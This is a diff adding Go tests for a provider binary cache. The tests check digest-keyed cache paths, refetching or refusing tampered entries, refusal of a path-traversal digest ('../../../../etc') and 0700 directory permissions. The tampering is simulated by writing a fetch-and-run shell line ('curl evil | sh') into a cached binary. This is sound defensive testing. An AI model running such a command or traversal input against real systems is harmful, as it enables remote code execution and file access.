@@ -144,7 +144,7 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 		t.Fatalf("Binary: %v", err)
 	}
 
-	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", "provider-aws")
+	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", digest, "provider-aws")
 	if path != want {
 		t.Fatalf("Binary() = %q, want %q", path, want)
 	}
@@ -185,6 +185,126 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 
 	if entries, err := os.ReadDir(store.Dir); err != nil || len(entries) != 0 {
 		t.Fatalf("the cache holds %v (err %v), want nothing written", entries, err)
+	}
+}
+
+func TestACachedProviderAlteredAfterItsInstallIsRefetched(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	before := rel.requests.Load()
+	again, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("second Binary: %v", err)
+	}
+	if again != path {
+		t.Fatalf("Binary() = %q, want the same path %q", again, path)
+	}
+	if rel.requests.Load() == before {
+		t.Fatal("an altered cache entry was served without being fetched again")
+	}
+	body, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(body), "evil") {
+		t.Fatalf("the altered provider is still cached: %q", body)
+	}
+}
+
+func TestACachedProviderAlteredAfterItsInstallIsRefusedWhenItCannotBeRefetched(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	rel.server.Close()
+
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err == nil {
+		t.Fatal("Binary() error = nil, want the altered cache entry refused")
+	}
+}
+
+func TestALockPinningAnotherDigestIsNeverServedFromTheCache(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+
+	other := strings.Repeat("a", 64)
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, other)
+	if err == nil {
+		t.Fatal("Binary() error = nil, want the archive the release serves refused against the other pin")
+	}
+	if !strings.Contains(err.Error(), other) {
+		t.Errorf("error %q does not name the digest the lock pins", err.Error())
+	}
+}
+
+func TestADigestThatIsNotASha256IsRefusedRatherThanMadeIntoAPath(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "../../../../etc")
+	if err == nil {
+		t.Fatal("Binary() error = nil, want a digest that is not a sha256 refused")
+	}
+	if rel.requests.Load() != 0 {
+		t.Fatal("the release was reached for a digest that is not a sha256")
+	}
+}
+
+func TestTheProviderCacheIsReadableOnlyByTheUserThatFetchedIt(t *testing.T) {
+	t.Parallel()
+
+	rel := fakeRelease(t, "aws")
+	store := storeFor(t, rel)
+	store.Dir = filepath.Join(store.Dir, "providers")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
+	digest := pinsOf(t, store)[asset]
+
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
+	if err != nil {
+		t.Fatalf("Binary: %v", err)
+	}
+
+	for dir := filepath.Dir(path); dir != filepath.Dir(store.Dir); dir = filepath.Dir(dir) {
+		info, err := os.Stat(dir)
+		if err != nil {
+			t.Fatalf("stat %s: %v", dir, err)
+		}
+		if got := info.Mode().Perm(); got != 0o700 {
+			t.Errorf("%s is %v, want 0700", dir, got)
+		}
 	}
 }
 
